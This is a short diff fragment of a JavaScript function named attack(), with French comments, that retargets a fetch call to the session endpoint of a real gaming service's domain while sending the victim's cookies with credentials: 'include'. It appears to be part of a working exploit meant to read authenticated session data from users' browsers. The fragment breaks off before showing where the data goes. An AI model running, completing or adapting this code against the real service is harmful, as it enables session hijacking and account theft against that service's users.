@@ -14,7 +14,7 @@ async function attack() {
     
     try {
         // ATTENTION : Utilise play.immutable.com, pas www.immutable.com
-        const res = await fetch('https://api.immutable.com/v2/rewards/earnings', {
+        const res = await fetch('https://play.immutable.com/api/auth/session', {
             method: 'GET',
             credentials: 'include',  // Envoie les cookies automatiquement
             headers: {
